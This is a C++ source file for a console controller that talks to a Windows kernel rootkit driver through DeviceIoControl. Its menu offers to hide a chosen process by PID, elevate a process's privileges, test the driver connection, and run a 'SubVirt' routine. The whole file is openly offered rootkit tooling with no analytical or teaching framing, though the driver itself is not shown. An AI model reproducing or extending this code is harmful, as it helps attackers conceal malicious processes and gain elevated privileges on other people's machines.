#include <iostream>
#include <Windows.h>
#include <string.h>
#include "IOCTLs.h"

using namespace std;

int main() {
	HANDLE hDevice;
	DWORD bytesReturned;;
	BOOL success;
	int option;
	char inbuffer[100] = { 0 };
	char outbuffer[100] = { 0 };
	char buf[100] = { 0 };

	hDevice = CreateFileW(L"\\\\.\\Rootkit",GENERIC_READ| GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_EXISTING, 0, NULL);

	cout << "hDevice handle : " << hDevice << endl;

	 if (hDevice == INVALID_HANDLE_VALUE) {
		 cout << "Failed to open device "<< GetLastError() << endl;
		 return 1;
	 }

	 while (1) {
		 printf("Menu:\n");
		 cout << "1. Hide Process" << endl;
		 cout << "2. Elevate Process" << endl;	
		 cout << "3. Test Connection" << endl;
		 cout << "4. SubVirt" << endl;

		 cout << "Enter option: ";
		 cin >> option;

		 switch (option)
		 {
		 case 1:
			 cout << "Enter the pid to hide : "; cin >> buf;
			 strcpy_s(inbuffer, buf);

			 success = DeviceIoControl(hDevice, Hide, inbuffer, sizeof(inbuffer), outbuffer, sizeof(outbuffer), &bytesReturned, NULL);
			 if (success) {
				 cout << "Process Hidden" << endl;
			 }
			 else {
				 cout << "Failed to hide process" << endl;
			 }
			 break;

		 case 2:
			 success = DeviceIoControl(hDevice, ElevateProcess, inbuffer, sizeof(inbuffer), outbuffer, sizeof(outbuffer), &bytesReturned, NULL);
			 if (success) {
				 cout << "Process Elevated" << endl;
			 }
			 else {
				 cout << "Failed to elevate process" << endl;
			 }
			 break;

		 case 3:
			 cout << "Enter message to send to kernel : "; cin >> buf;
			 strcpy_s(inbuffer, buf);

			 success = DeviceIoControl(hDevice, TestConnection, inbuffer, sizeof(inbuffer), outbuffer, sizeof(outbuffer), &bytesReturned, NULL);
			 if (success) {
				 cout << "Message from Kernel: " << outbuffer << endl;
				 cout << "Connection Successful" << endl;
			 }
			 else {
				 cout << "Failed to connect" << endl;
			 }
			 break;

		 case 4:
			 success = DeviceIoControl(hDevice, SubVirt, inbuffer, sizeof(inbuffer), outbuffer, sizeof(outbuffer), &bytesReturned, NULL);
			 if (success) {
				 cout << "SubVirt Successful" << endl;
			 }



			 else {
				 cout << "Failed to SubVirt" << endl;
			 }
			 break;
		 default:
			 break;
		 }
	 }
	 return 0;
}
